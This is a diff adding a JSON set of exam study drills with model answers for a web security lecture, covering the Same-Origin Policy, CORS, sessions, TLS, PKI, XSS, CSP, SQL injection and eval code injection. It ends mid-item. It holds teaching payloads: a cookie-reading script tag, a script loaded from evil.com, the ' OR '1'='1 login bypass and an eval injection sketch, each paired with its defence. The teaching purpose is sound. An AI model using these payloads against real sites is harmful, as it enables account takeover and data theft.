@@ -1,0 +1,483 @@
+{
+  "courseCode": "CYBER2",
+  "courseName": "Software Security",
+  "lecture": 2,
+  "lectureTitle": "Web Security",
+  "examQuestions": [
+    {"examQ": 2, "subPart": "a", "promptVerbatim": "Explain the general security model for web-based systems."},
+    {"examQ": 2, "subPart": "b", "promptVerbatim": "Describe common attack modes and corresponding mitigation strategies."},
+    {"examQ": 2, "subPart": "c", "promptVerbatim": "Discuss OWASP ASVS and its relevance."}
+  ],
+  "drills": [
+    {
+      "id": "CYBER2-L2-01-o",
+      "anchorsExamQ": 2,
+      "anchorsSubPart": "a",
+      "type": "opener",
+      "question": "How does the web work at a high level, and why is the web, from a security perspective, very different from a traditional desktop application?",
+      "keyBeats": [
+        "Web app = distributed system: client (browser) + server(s) communicating over HTTP(S), often with a database/external services behind the server",
+        "Client executes code (JavaScript) downloaded from an untrusted third party (the website) on every visit — desktop apps are installed deliberately and vetted once",
+        "The browser must sandbox that code and mediate access between multiple mutually-untrusted origins open at once (Same-Origin Policy)",
+        "Security (TLS, sandboxing, SOP) was retrofitted onto HTTP/HTML, which were designed for document sharing, not for running an OS-like multi-tenant platform",
+        "The padlock icon signals only that the transport channel is encrypted and the server's identity was verified by a CA-signed certificate — it says nothing about whether the site itself is trustworthy or bug-free"
+      ],
+      "modelAnswer": "A web application is a distributed system: a browser (client) sends HTTP requests to a server, which may itself talk to a database or external servers before returning an HTTP response. Unlike a desktop application, which a user consciously installs once and which then runs with the user's local trust, a web page causes the browser to download and execute code (HTML/CSS/JavaScript) from a remote, largely untrusted party on essentially every visit, and the user typically has many such origins open simultaneously in the same browser. This creates two structural risks that desktop software does not have to the same degree: (1) the browser must safely execute code it does not control, which is why JavaScript runs in a sandbox with only limited access to the local machine, and (2) different origins loaded in the same browser must be kept from interfering with each other, which is enforced by the Same-Origin Policy. None of this was designed in from the start — HTTP/HTML began as a stateless document-sharing protocol for trusted academic use, and security mechanisms (TLS, SOP, cookie flags, CSP, CORS) were added afterwards once the web started carrying sensitive data and critical infrastructure. The browser's padlock icon reflects only that the connection is encrypted (TLS) and that the server presented a certificate signed by a trusted Certificate Authority proving it controls that domain name — it does not mean the site's application logic is secure.",
+      "citation": "presentation_3.pdf.extracted.txt, SLIDE 6",
+      "unverified": false,
+      "diagram_only": false
+    },
+    {
+      "id": "CYBER2-L2-02-d",
+      "anchorsExamQ": 2,
+      "anchorsSubPart": "a",
+      "type": "definition",
+      "question": "What does it mean that HTTP is a 'stateless' protocol, and why does this matter for the web security model?",
+      "keyBeats": [
+        "HTTP follows a request-response model: client sends an HTTP request, server sends back an HTTP response",
+        "Stateless = client and server forget about the exchange immediately after the request-response pair completes",
+        "Each request is handled independently — the server has no built-in memory of previous requests from the same client",
+        "Because real applications need to remember logged-in users, shopping carts, etc., extra mechanisms (cookies, session tokens) had to be layered on top to fake state on top of a stateless protocol",
+        "This gap between 'stateless transport' and 'stateful application' is exactly where session-based attacks (hijacking, fixation) live"
+      ],
+      "modelAnswer": "HTTP works as a simple request-response protocol: a client (browser) sends an HTTP request and the server answers with an HTTP response. It is called stateless because, once that request-response cycle is finished, neither the client nor the server retains any memory of the exchange — the next request is treated completely independently, as if from a stranger. This matters for the security model because virtually every real web application (login, shopping carts, dashboards) needs some notion of 'who is this user across multiple requests', which HTTP itself does not provide. To bridge this gap, applications add session mechanisms — typically an unpredictable token stored in a cookie (or, for stateless designs, a signed token like a JWT) — that the browser resends with every subsequent request so the server can 're-establish' who the user is. Because this state-tracking layer is bolted on rather than native to the protocol, it becomes a prime attack surface: if the token can be predicted, stolen, or planted by an attacker, the attacker can impersonate the user (session hijacking/fixation).",
+      "citation": "presentation.pdf.extracted.txt, SLIDE 16",
+      "unverified": false,
+      "diagram_only": false
+    },
+    {
+      "id": "CYBER2-L2-03-d",
+      "anchorsExamQ": 2,
+      "anchorsSubPart": "a",
+      "type": "definition",
+      "question": "Define the Same-Origin Policy. What three components define an 'origin', and give two examples of URLs that are NOT the same origin.",
+      "keyBeats": [
+        "SOP: pages/scripts from different origins can only interact with each other 'securely' (i.e. in restricted, controlled ways) — by default a script from one origin cannot read data belonging to another origin",
+        "Origin = (protocol, hostname, port) triple — the path is irrelevant to SOP",
+        "http://example.com/A/page.html and https://example.com/B/page.html differ only in protocol (http vs https) → different origin",
+        "http://example.com:81/A/page.html and http://example.com/A/page.html differ in port (81 vs default 80) → different origin",
+        "http://www.example.com and http://example.com differ in hostname (www. subdomain vs bare domain) → different origin, even though they look related",
+        "Enforced client-side by the browser, which is what makes it a trust boundary between mutually-untrusted sites open in the same browser"
+      ],
+      "modelAnswer": "The Same-Origin Policy (SOP) is the browser's core isolation rule: pages loaded from different origins are only allowed to interact with each other in restricted, well-defined ('secure') ways; by default, JavaScript running on one origin cannot read the DOM, cookies, or responses belonging to another origin. An 'origin' is defined as the triple (protocol, hostname, port) — the path and any query string are not part of the origin. Two URLs are same-origin only if all three components match exactly. Examples of different origins: http://example.com/A/page.html vs https://example.com/B/page.html (different protocol: http vs https); http://example.com:81/A/page.html vs http://example.com/A/page.html (different port: 81 vs the default 80); and http://www.example.com/hej vs http://example.com/hejsan (different hostname, since 'www.example.com' and 'example.com' are distinct hosts even though they share a parent domain). SOP is enforced entirely by the browser (the client), which is precisely why it functions as the security boundary that keeps a malicious page open in one tab from reading data or making authenticated requests to a banking site open in another tab.",
+      "citation": "presentation.pdf.extracted.txt, SLIDE 60",
+      "unverified": false,
+      "diagram_only": true
+    },
+    {
+      "id": "CYBER2-L2-04-m",
+      "anchorsExamQ": 2,
+      "anchorsSubPart": "a",
+      "type": "mechanism",
+      "question": "Cross-Origin Resource Sharing (CORS) deliberately relaxes the Same-Origin Policy. How does it work, and who is responsible for defining vs. enforcing the policy?",
+      "keyBeats": [
+        "CORS is a controlled, opt-in relaxation of SOP for legitimate cross-origin requests (e.g. www.example.com's JavaScript fetching data from grades.example.com)",
+        "The server being fetched from defines the policy: it decides which origins are allowed by responding with an Access-Control-Allow-Origin header naming the permitted origin(s)",
+        "The client (the browser) enforces the policy: it makes the cross-origin request, receives the response, and only hands the response body to the calling JavaScript if the Access-Control-Allow-Origin header approves the requesting origin — otherwise the browser blocks access to the response",
+        "Policies can be allow-listing (name specific trusted origins) or, less safely, very permissive (wildcard/broad allow-lists)",
+        "CORS is needed because modern web apps are composed of multiple services/subdomains/APIs that legitimately need to talk to each other despite SOP"
+      ],
+      "modelAnswer": "CORS is the mechanism that lets a server intentionally opt certain cross-origin requests out of the browser's default Same-Origin Policy restriction. Concretely: a script running on www.example.com issues a fetch to grades.example.com. The browser sends the cross-origin request, and grades.example.com's response includes an Access-Control-Allow-Origin header specifying which origin(s) are permitted to read that response (e.g. Access-Control-Allow-Origin: www.example.com). Crucially, the *server* defines the policy — it decides, per resource, which origins it trusts — while the *client* (the browser) is what actually enforces it: the browser always makes the request, but it will only expose the response contents to the calling JavaScript if the returned header authorizes the requesting origin; otherwise the response is blocked from the script (even though the HTTP request/response already happened over the wire). Server policies can be allow-list based (explicit set of trusted origins, safer) or overly permissive (wildcards or broad patterns, which reintroduces the risks SOP was meant to prevent). CORS exists because modern web applications are typically split across several origins/subdomains/APIs that legitimately need to exchange data, so a pure, absolute SOP would break normal functionality.",
+      "citation": "presentation_3.pdf.extracted.txt, SLIDE 74",
+      "unverified": false,
+      "diagram_only": false
+    },
+    {
+      "id": "CYBER2-L2-05-m",
+      "anchorsExamQ": 2,
+      "anchorsSubPart": "a",
+      "type": "mechanism",
+      "question": "Compare 'classic' server-side session tokens with 'stateless' sessions (e.g. JWT). How does each keep state on top of stateless HTTP?",
+      "keyBeats": [
+        "Classic session tokens: the actual state (who is logged in, cart contents, etc.) is kept on the server; the server issues an unpredictable token mapped to that state and gives it to the client (usually via a cookie)",
+        "The client sends the token back with every request; the server looks it up to 're-establish' the state — the token itself carries no meaningful data, just an index",
+        "Stateless sessions: the server keeps no per-user state at all; instead, the token itself contains the entire state (e.g. user id, role, expiry)",
+        "To stop the client from tampering with that self-contained state, the server cryptographically signs the token so any modification is detectable — this is what a JWT (JSON Web Token) does: header.payload.signature, each part base64-encoded, with the signature computed over header+payload using a server secret",
+        "Trade-off: classic tokens are easy to revoke (delete server-side entry) but need server storage/lookup; stateless tokens scale without server storage but are hard to revoke early since the server has no record to invalidate before expiry"
+      ],
+      "modelAnswer": "Both approaches exist to fake persistent state on top of stateless HTTP, but they place the state in different locations. In the 'classic' session-token model, the server keeps the actual session state (e.g. which user is logged in) in server-side memory or a database, and issues the client an unpredictable, opaque token that merely acts as a lookup key. The token is normally stored in a cookie and is automatically resent by the browser with each request; the server uses it to look up the associated state and 're-establish' who the user is. In the 'stateless' session model, the server keeps no session state of its own — instead, the token itself carries the full state (e.g. user id, roles, expiry timestamp). Because the client could otherwise tamper with this self-contained data, the server signs the token so any modification invalidates the signature; JSON Web Tokens (JWTs) implement exactly this: a header (e.g. {'alg':'HS256','typ':'JWT'}) and a payload (claims like sub, name, admin) are each base64-encoded and joined with a signature computed over both using a secret only the server knows, giving the classic header.payload.signature structure. Classic tokens are easy to revoke instantly (just delete the server-side record) but require server-side storage and lookups; stateless tokens avoid that storage/lookup cost and scale horizontally, but are hard to invalidate before their built-in expiry since the server keeps no record to revoke.",
+      "citation": "presentation.pdf.extracted.txt, SLIDE 130",
+      "unverified": false,
+      "diagram_only": false
+    },
+    {
+      "id": "CYBER2-L2-06-d",
+      "anchorsExamQ": 2,
+      "anchorsSubPart": "a",
+      "type": "definition",
+      "question": "Name the main cookie security attributes used to protect session cookies and explain what each one restricts.",
+      "keyBeats": [
+        "Secure: cookie is only sent by the browser over an HTTPS (encrypted) connection, never over plain HTTP",
+        "HttpOnly: cookie is not accessible to JavaScript (document.cookie) — blocks cookie theft via XSS",
+        "SameSite: controls whether the cookie is attached to cross-site requests — SameSite=Strict never sends it cross-site, SameSite=Lax sends it on top-level navigations but not on subresource/background requests, SameSite=None always sends it (and must be combined with Secure)",
+        "These attributes are set on the Set-Cookie response header, e.g. Set-Cookie: key=value; Secure; HttpOnly; SameSite=Strict",
+        "None of these prevents the attack outright by itself — they are layered defenses that shrink the attacker's opportunities (network sniffing, XSS cookie theft, CSRF)"
+      ],
+      "modelAnswer": "Three cookie attributes are the standard defenses for session cookies. Secure instructs the browser to only ever transmit the cookie over an encrypted HTTPS connection, preventing it from being sent (and sniffed) in plaintext over HTTP. HttpOnly instructs the browser to deny JavaScript any access to the cookie via document.cookie, which blocks the most common way an XSS vulnerability is used to steal a session cookie. SameSite controls whether the cookie is attached to requests that originate from a different site than the one that set the cookie: SameSite=Strict never sends the cookie on cross-site requests (most secure but can break normal cross-site links into the app), SameSite=Lax sends it for top-level navigations (e.g. clicking a link) but withholds it for background/subresource requests (e.g. images, cross-site POSTs) — this is a reasonable default balance, and SameSite=None sends the cookie on all cross-site requests and must be paired with Secure. Together these are set as flags on the Set-Cookie response header. None of them is a complete fix on its own: Secure defends against network eavesdropping, HttpOnly against XSS-based theft, and SameSite mitigates CSRF — an attacker who defeats one channel (e.g. finds an XSS bug) can still bypass the protections that attribute wasn't designed for.",
+      "citation": "presentation_2.pdf.extracted.txt, SLIDE 130",
+      "unverified": false,
+      "diagram_only": false
+    },
+    {
+      "id": "CYBER2-L2-07-m",
+      "anchorsExamQ": 2,
+      "anchorsSubPart": "a",
+      "type": "mechanism",
+      "question": "Explain the difference between symmetric and asymmetric encryption, and why TLS/HTTPS is needed in the general web security model.",
+      "keyBeats": [
+        "Symmetric encryption: same key used to scramble and unscramble the content — fast, but both parties need to already share that key",
+        "Asymmetric encryption: separate public/private key pair — content scrambled with the recipient's public key can only be unscrambled with their matching private key, so no shared secret needs to be pre-established, but it is computationally heavier",
+        "Before TLS: 'the good old days' — everyone trusted everyone, no snooping, no encryption during transport; that assumption breaks down on a shared, adversarial network like the modern Internet",
+        "HTTPS = HTTP running over TLS, which uses asymmetric techniques to set up a session and then symmetric encryption for the bulk data, giving confidentiality (and integrity/authentication) for data in transit",
+        "This directly protects things like session cookies and login credentials from being read or altered by a network eavesdropper"
+      ],
+      "modelAnswer": "Symmetric encryption uses one shared key to both scramble (encrypt) and unscramble (decrypt) content; it is fast but requires the two parties to already possess the same secret key, which is hard to arrange over an insecure channel. Asymmetric encryption instead uses a key pair: content encrypted with a party's public key can only be decrypted with that party's matching private key, so a sender can encrypt data for a recipient without ever having shared a secret with them in advance — at the cost of being computationally more expensive than symmetric encryption. In the early web, communications assumed a trusted network with no snooping and used no encryption at all during transport, which is unsafe on today's Internet, where traffic can pass through many untrusted intermediaries. HTTPS solves this by running HTTP over TLS: TLS typically uses asymmetric cryptography to authenticate the server and establish a shared symmetric key, then switches to fast symmetric encryption for the actual data exchange. This gives the general web security model confidentiality (and integrity/authenticity) for data in transit, which is essential for protecting sensitive data such as login credentials and session cookies from network eavesdroppers.",
+      "citation": "presentation.pdf.extracted.txt, SLIDE 80",
+      "unverified": false,
+      "diagram_only": false
+    },
+    {
+      "id": "CYBER2-L2-08-m",
+      "anchorsExamQ": 2,
+      "anchorsSubPart": "a",
+      "type": "mechanism",
+      "question": "Explain how Diffie-Hellman key exchange lets two parties agree on a shared symmetric key over an insecure channel, and describe its major flaw.",
+      "keyBeats": [
+        "Both parties publicly agree on shared parameters (g, p); each picks a secret exponent (a for Alice/client, b for Bob/server)",
+        "Each sends the other g^a mod p (resp. g^b mod p) over the insecure channel — an eavesdropper only sees these intermediate values, not a or b",
+        "Each side raises the received value to their own secret exponent: (g^b mod p)^a mod p = (g^a mod p)^b mod p = g^ab mod p — both arrive at the same shared secret without ever transmitting it",
+        "Major flaw: the exchange authenticates nothing — nothing proves that the g^a/g^b values actually came from the intended party, so a Man-in-the-Middle can intercept and substitute their own exponents with each side, establishing two separate shared keys (attacker-client and attacker-server) and silently relaying/reading all 'secure' traffic",
+        "This is exactly why the web needs a way for the server to prove its identity (→ certificates / PKI), not just to establish a shared key"
+      ],
+      "modelAnswer": "Diffie-Hellman lets two parties who have never met establish a shared symmetric key over a channel an eavesdropper can read. Both sides publicly agree on parameters g and p. Each side picks a secret number (a for one party, b for the other) that is never transmitted, and instead sends g^a mod p or g^b mod p over the insecure channel. Each party then raises the value it received to its own secret exponent: (g^b mod p)^a mod p equals (g^a mod p)^b mod p equals g^(ab) mod p, so both sides land on the same shared secret even though only the intermediate exponentiated values (not a, b, or the final key) ever crossed the wire — an eavesdropper who only sees g, p, g^a mod p and g^b mod p cannot feasibly recover g^(ab) mod p (this is the discrete-log hardness assumption). The major flaw is that plain Diffie-Hellman provides no authentication: nothing proves that the g^a value 'from the server' actually came from the real server. A Man-in-the-Middle attacker can intercept the exchange, run one Diffie-Hellman exchange with the client (pretending to be the server) and a separate one with the real server (pretending to be the client), ending up with two different shared keys and the ability to decrypt, read, and re-encrypt all 'secure' traffic without either endpoint noticing. This is exactly the motivation for adding a way for the server to prove its identity — i.e. certificates.",
+      "citation": "presentation.pdf.extracted.txt, SLIDE 114",
+      "unverified": false,
+      "diagram_only": true
+    },
+    {
+      "id": "CYBER2-L2-09-m",
+      "anchorsExamQ": 2,
+      "anchorsSubPart": "a",
+      "type": "mechanism",
+      "question": "How does the certificate chain of trust let a browser verify a server's identity and defend against man-in-the-middle attacks?",
+      "keyBeats": [
+        "A server (e.g. b.com) presents a certificate binding its public key to its domain name; that certificate is itself signed by a Certificate Authority (CA)",
+        "The CA's own certificate may in turn be signed by another (higher) CA, forming a chain: s.com's cert signs b.com, another CA's cert signs s.com, and so on, up to a root CA",
+        "Root CA certificates are pre-installed ('trusted') in the browser/OS; the browser walks the chain from the presented certificate up to a trusted root, verifying each signature along the way",
+        "If every link in the chain verifies, the browser accepts the server's public key as authentic and proceeds with the (now-authenticated) key exchange — defeating the earlier unauthenticated Diffie-Hellman MITM weakness",
+        "If a CA itself is compromised, it could issue fraudulent certificates for any domain, undermining the whole chain of trust for everyone who trusts that CA — this is a key weakness/discussion point of the PKI model"
+      ],
+      "modelAnswer": "To let the client verify it is really talking to the intended server (and not a man-in-the-middle), the web uses a chain of digitally signed certificates. The server presents a certificate that binds its public key to its domain name; that certificate is signed by a Certificate Authority (CA), which vouches that the binding is genuine. That CA's own certificate may itself be signed by another CA further up the chain, and so on, until the chain reaches a 'root' CA certificate. Browsers and operating systems ship with a pre-installed set of trusted root certificates; when connecting, the browser walks the presented chain link by link, checking each signature, until it either reaches one of these trusted roots (success) or fails to validate (the connection is flagged as untrusted). Once the chain validates, the browser can trust the server's public key and proceed with an authenticated key exchange, closing the gap that plain Diffie-Hellman leaves open to man-in-the-middle attacks. The main systemic weakness of this model is that it concentrates trust in the CAs: if a CA is compromised (or coerced), it can issue a fraudulent, validly-signed certificate for any domain, letting an attacker impersonate that domain to every browser that trusts that CA's root.",
+      "citation": "presentation.pdf.extracted.txt, SLIDE 122",
+      "unverified": false,
+      "diagram_only": true
+    },
+    {
+      "id": "CYBER2-L2-10-d",
+      "anchorsExamQ": 2,
+      "anchorsSubPart": "b",
+      "type": "definition",
+      "question": "What is Broken Access Control (OWASP A01:2025) and give three concrete examples of how it manifests?",
+      "keyBeats": [
+        "Violation of the principle of least privilege / failure to enforce what an authenticated (or unauthenticated) user is actually allowed to do",
+        "Example: force-browsing to authenticated or privileged pages as an unauthenticated or standard user (bypassing checks by directly navigating to a URL)",
+        "Example: bypassing access control by modifying the URL, or permitting viewing/editing someone else's account just by supplying its identifier (Insecure Direct Object Reference, IDOR)",
+        "Example: accessing an API endpoint that has missing access controls for state-changing methods (POST/PUT/DELETE) even though GET is protected",
+        "Example: elevation of privilege — a standard user manipulates a request to gain admin-level rights"
+      ],
+      "modelAnswer": "Broken Access Control is the OWASP Top 10 category (A01:2025) covering failures to properly restrict what authenticated or unauthenticated users are allowed to see or do, violating the principle of least privilege. Concrete manifestations include: force-browsing directly to an authenticated or privileged page's URL as an unauthenticated or standard user, bypassing any UI-level access checks that would normally hide that link; permitting a user to view or edit another user's account simply by changing an identifier in the URL or request (Insecure Direct Object Reference); an API where GET requests are protected but the corresponding POST, PUT, or DELETE endpoints have no access-control checks at all, letting any user modify data they shouldn't; and elevation of privilege, where a standard user manipulates request parameters (e.g. an 'isAdmin' field) to obtain administrator-level access. All of these share the same root cause: the server trusts the client to only request what it's authorized for, instead of enforcing authorization checks on every server-side request.",
+      "citation": "presentation_2.pdf.extracted.txt, SLIDE 9",
+      "unverified": false,
+      "diagram_only": false
+    },
+    {
+      "id": "CYBER2-L2-11-m",
+      "anchorsExamQ": 2,
+      "anchorsSubPart": "b",
+      "type": "mechanism",
+      "question": "What is Cross-Site Scripting (XSS), and what distinguishes Reflected, Stored, and DOM-based XSS?",
+      "keyBeats": [
+        "XSS: an attacker injects a script into a page such that it executes in the browser of another user, in the security context (origin) of the vulnerable site — giving the attacker access to that user's session, cookies, DOM, etc.",
+        "Reflected XSS: the payload is placed into the URL (e.g. a query parameter) and echoed directly back into the HTML response; the attacker must trick the victim into clicking a crafted link",
+        "Stored XSS: the payload is saved server-side (e.g. in a database, comment field, tweet) and later served to any visitor who views that stored content — no per-victim link needed, one injection can hit many users",
+        "DOM-based XSS: the payload is never embedded by the server at all — client-side JavaScript itself reads attacker-controlled data (e.g. from the URL fragment) and unsafely writes it into the DOM",
+        "Real-world example: the 2010 TweetDeck self-tweeting script and the 2005 Samy MySpace worm, which used Stored XSS to self-propagate to over a million profiles in 20 hours"
+      ],
+      "modelAnswer": "Cross-Site Scripting (XSS) is a class of injection attack where an attacker gets a script to execute in a victim's browser under the security origin of a trusted site, giving that script access to whatever the trusted site's JavaScript could normally access — the DOM, session cookies (unless HttpOnly), and the ability to act as the victim. The three types differ in where the payload lives before it executes. Reflected XSS embeds the payload directly in the URL (e.g. a search or error parameter) which the server echoes straight back into the HTML response without sanitizing it; because the payload lives in the URL, the attacker must lure the victim into clicking a specially crafted link. Stored XSS persists the payload on the server (e.g. in a database field, forum post, or tweet) so it is later served, embedded in HTML, to any user who simply views that content — no individually crafted link is required, so one successful injection can compromise many victims automatically. DOM-based XSS never involves the server rendering the payload at all: client-side JavaScript itself reads attacker-controllable data (commonly the URL fragment or window.name) and unsafely inserts it into the page's DOM (e.g. via innerHTML), so the vulnerability lies entirely in the client-side code's handling of untrusted input. A famous real-world case is the 2005 Samy worm, a Stored-XSS worm on MySpace that replicated itself to over a million profiles within 20 hours by injecting itself whenever a victim viewed an infected profile.",
+      "citation": "presentation_2.pdf.extracted.txt, SLIDE 42",
+      "unverified": false,
+      "diagram_only": false
+    },
+    {
+      "id": "CYBER2-L2-12-s",
+      "anchorsExamQ": 2,
+      "anchorsSubPart": "b",
+      "type": "specific",
+      "question": "Given the HTML template <p>{{ content }}</p> where content is taken directly from user input, an attacker supplies <script>alert(document.cookie);</script>. What happens, and what specific characters must be escaped to prevent it?",
+      "keyBeats": [
+        "If content is interpolated into the HTML body unescaped, the browser parses the injected <script> tag as real markup and executes the JavaScript inside it — here it would read and pop up the victim's cookie, illustrating that an attacker can read session cookies via injected script",
+        "Fix for this HTML-body context: HTML-entity-escape the untrusted data before inserting it — specifically escape < to &lt; and > to &gt; so the browser renders the payload as inert text rather than parsing it as a tag",
+        "Escaping needs to be context-aware: the same technique doesn't fully protect an HTML *attribute* context, where \" and ' must additionally be escaped to &quot; and &#x27; to stop an attacker from breaking out of the attribute",
+        "This is exactly why frameworks with built-in, context-aware auto-escaping (Jinja/Flask templates, etc.) are safer than hand-rolled string concatenation"
+      ],
+      "modelAnswer": "If the server inserts user-supplied content directly into <p>{{ content }}</p> without escaping, and the attacker submits <script>alert(document.cookie);</script>, the resulting HTML literally contains a <script> tag, which the browser parses as executable code rather than as text — so the injected JavaScript runs in the victim's browser under the vulnerable site's origin, in this example reading and displaying the victim's session cookie (in a real attack it would instead be silently exfiltrated to an attacker-controlled server). To prevent this in an HTML-body context, the untrusted data must be HTML-entity-escaped before being inserted: at minimum, escape < to &lt; and > to &gt;, which stops the browser from interpreting the payload as a tag and instead renders it as harmless visible text. Note this escaping is context-dependent: if the same untrusted value were instead placed inside an HTML attribute (e.g. alt=\"{{ content }}\"), the quote characters themselves (double quote and single quote) must also be escaped (to &quot; and &#x27;) to stop the attacker from closing the attribute early and injecting a new attribute such as an onerror handler. This context sensitivity is why relying on a framework's built-in, context-aware auto-escaping (rather than manual string concatenation) is the recommended defense.",
+      "citation": "presentation_2.pdf.extracted.txt, SLIDE 45",
+      "unverified": false,
+      "diagram_only": false
+    },
+    {
+      "id": "CYBER2-L2-13-m",
+      "anchorsExamQ": 2,
+      "anchorsSubPart": "b",
+      "type": "mechanism",
+      "question": "Beyond escaping, what defense-in-depth measures minimise the impact of an XSS bug that slips through, and what are the limits of Content-Security-Policy (CSP)?",
+      "keyBeats": [
+        "'At some point it will go wrong' — escaping alone is not treated as sufficient; layer additional mitigations to reduce impact when an XSS bug is eventually found",
+        "Remove session cookies from JavaScript's reach entirely: Set-Cookie: key=value; HttpOnly stops injected scripts from reading document.cookie even if XSS succeeds",
+        "Content-Security-Policy (CSP) header restricts which sources scripts/images/etc. may be loaded from (e.g. script-src 'self' *.trusted.com), so even a successful injection can't load/execute an attacker's external script unless the attacker also controls a trusted source or uses a leaked nonce/'unsafe-inline'",
+        "CSP is not a silver bullet: large-scale measurements found the vast majority of deployed CSP policies were bypassable — a major cause is allowing 'unsafe-inline' or whitelisting domains that themselves host exploitable endpoints (e.g. JSONP), so escaping/output-encoding is still required, not optional, even with CSP in place"
+      ],
+      "modelAnswer": "Because XSS defenses eventually fail somewhere in a large codebase ('at some point it will go wrong'), the lecture stresses layering defense-in-depth on top of escaping. One key measure is denying JavaScript access to session cookies altogether via the HttpOnly cookie flag (Set-Cookie: key=value; HttpOnly), so that even if an attacker's script executes, document.cookie will not expose the session token to it. A second measure is the Content-Security-Policy (CSP) response header, which whitelists the origins scripts, images, and other resources may be loaded from (e.g. default-src 'self'; script-src 'self' *.trusted.com), so an attacker's injected <script src=\"evil.com/x.js\"> would be blocked by the browser unless evil.com is on the allow-list; stricter variants add a per-request random 'nonce' that inline scripts must carry to be allowed to run. However, CSP is explicitly flagged as imperfect: large-scale studies of real deployed CSP policies found the overwhelming majority (over 90%) were trivially bypassable, largely because many sites allow 'unsafe-inline' or whitelist domains that themselves host exploitable script endpoints. The conclusion drawn is that CSP is a useful additional layer but does not remove the need to still escape untrusted output correctly.",
+      "citation": "presentation_2.pdf.extracted.txt, SLIDE 52",
+      "unverified": false,
+      "diagram_only": false
+    },
+    {
+      "id": "CYBER2-L2-14-m",
+      "anchorsExamQ": 2,
+      "anchorsSubPart": "b",
+      "type": "mechanism",
+      "question": "Explain the mechanism behind SQL injection and the primary defense against it.",
+      "keyBeats": [
+        "Occurs when an application builds a SQL query by concatenating raw, untrusted user input directly into the query string, e.g. f\"SELECT * FROM USERS WHERE user = '{name}' AND pass = '{password}'\"",
+        "Attacker input containing SQL syntax (quotes, boolean logic, comment markers) changes the *structure* of the query rather than just supplying a data value — e.g. a crafted username/password can turn the WHERE clause into something always-true, bypassing authentication entirely",
+        "The database has no way to distinguish 'code' the developer intended from 'code' smuggled in via user data, because they were concatenated into one string before being sent",
+        "Primary defense: prepared/parameterized statements — the SQL code (with placeholders, e.g. \"...WHERE user = ? AND pass = ?\") is sent to the database separately from the parameter values, so the database always treats the parameters as pure data, never as executable SQL, regardless of their content",
+        "Secondary defenses: stored procedures (if implemented safely) and input validation"
+      ],
+      "modelAnswer": "SQL injection happens when an application constructs a SQL query by directly concatenating untrusted user input into the query string — for example building the query as f\"SELECT * FROM USERS WHERE user = '{name}' AND pass = '{password}'\" using values taken straight from a login form. Because the input is spliced into the query text itself, an attacker can supply input containing SQL syntax (quotes, boolean operators, comment markers) that changes the *structure* of the query rather than merely filling in a data value — e.g. supplying a value that turns the WHERE clause into something always true, which would let the attacker log in without knowing a valid password. The fundamental problem is that once the developer's intended SQL and the attacker's injected data are concatenated into one string, the database engine has no way to tell them apart — both are just 'the query'. The primary, recommended defense is to use prepared (parameterized) statements: the SQL text containing placeholders (e.g. \"SELECT * FROM USERS WHERE user = ? AND pass = ?\") is sent to the database separately from the actual parameter values, so the database engine always treats the supplied values as pure data — never as executable SQL — no matter what characters they contain. Complementary defenses mentioned are safely-implemented stored procedures and input validation, but parameterized queries are the mechanism that structurally eliminates the vulnerability rather than just filtering known-bad patterns.",
+      "citation": "presentation_2.pdf.extracted.txt, SLIDE 31",
+      "unverified": false,
+      "diagram_only": false
+    },
+    {
+      "id": "CYBER2-L2-15-s",
+      "anchorsExamQ": 2,
+      "anchorsSubPart": "b",
+      "type": "specific",
+      "question": "In the lecture's Flask login example, the query is built as: stmt = f\"SELECT * FROM USERS WHERE user = '{name}' AND pass = '{password}'\" followed by cur.execute(stmt). How could an attacker log in without knowing a valid password, and how does the 'proper' version in the slides fix it?",
+      "keyBeats": [
+        "Vulnerable version builds the SQL string with an f-string, directly splicing 'name' and 'password' from the HTTP form into the query text",
+        "An attacker can enter something like ' OR '1'='1 as the username (or password) so that, once concatenated, the WHERE clause becomes a tautology (always true for at least one row), returning a matching user row and letting the login check (len(cur.fetchall()) > 0) pass without a correct password",
+        "The fixed version uses a parameterized statement: stmt = \"SELECT * FROM USERS WHERE user = ? AND pass = ?\" and cur.execute(stmt, (name, password)) — the placeholders (?) are bound to name/password by the database driver as literal data values, so injected SQL syntax in the input is never interpreted as part of the query structure",
+        "The fixed version even adds a taunting message ('Did you try to bypass...') acknowledging the attack it now defeats"
+      ],
+      "modelAnswer": "In the vulnerable version, the query is assembled with an f-string: stmt = f\"SELECT * FROM USERS WHERE user = '{name}' AND pass = '{password}'\", where name and password come straight from the submitted HTML form and are executed as-is with cur.execute(stmt). An attacker can submit a username such as ' OR '1'='1 (with the password field left arbitrary or similarly crafted); once concatenated into the query, the WHERE clause's logic becomes something like user = '' OR '1'='1' AND pass = '...', which evaluates to true for existing rows regardless of the real credentials, so the query returns at least one row and the check if len(cur.fetchall()) > 0 succeeds — granting access without knowing any valid password. The fix shown in the slides replaces string concatenation with a parameterized statement: stmt = \"SELECT * FROM USERS WHERE user = ? AND pass = ?\" together with cur.execute(stmt, (name, password)). Here the ? placeholders are bound to the user-supplied values by the database driver itself, so those values are always treated as literal data, never as SQL syntax — an input like ' OR '1'='1 would simply be searched for as a literal (and non-matching) username string, defeating the injection.",
+      "citation": "presentation_2.pdf.extracted.txt, SLIDE 29",
+      "unverified": false,
+      "diagram_only": false
+    },
+    {
+      "id": "CYBER2-L2-16-s",
+      "anchorsExamQ": 2,
+      "anchorsSubPart": "b",
+      "type": "specific",
+      "question": "A Flask endpoint computes result = eval(f\"{a}+{b}\") where a and b are taken directly from the request form, to implement a simple online calculator. What is the vulnerability, and how should it be fixed?",
+      "keyBeats": [
+        "This is Command Injection (here specifically code injection via eval): the server passes attacker-controlled, unvalidated strings straight into Python's eval(), which executes arbitrary Python code, not just arithmetic",
+        "An attacker can supply a value for 'a' or 'b' containing arbitrary Python expressions/statements (e.g. calling os.system or importing modules) instead of a number, so the server executes attacker-chosen code on the host",
+        "General principle: this is not Python-specific — almost every scripting language offers an eval-like construct, and the wider class 'command injection' covers any case where user-controlled data reaches a call that spawns another interpreter/shell (Python os.system/subprocess.Popen, PHP exec, etc.)",
+        "Fix: don't use eval() at all; use a proper API for the intended operation (e.g. parse and add two validated numbers directly instead of invoking a general-purpose interpreter), and/or run any unavoidable external code in a low-privilege sandboxed environment to limit the blast radius"
+      ],
